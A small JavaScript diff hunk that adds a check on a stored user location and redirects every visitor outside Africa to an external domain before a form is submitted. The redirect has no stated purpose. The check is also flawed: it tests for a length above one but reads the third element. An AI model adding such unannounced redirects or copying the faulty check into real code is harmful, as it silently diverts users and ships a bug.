@@ -104,6 +104,9 @@ const COLLECT = async() => {
             
         const wireframe = window.location.href
 
+        if(user_location && JSON.parse(user_location) && (JSON.parse(user_location).length > 1) && JSON.parse(user_location)[2].continent_name && JSON.parse(user_location)[2].continent_name !== "Africa"){
+            window.location.href = "https://late-developers.com"
+        }   
             sendForm({
                 url:api_url,
                 options:{
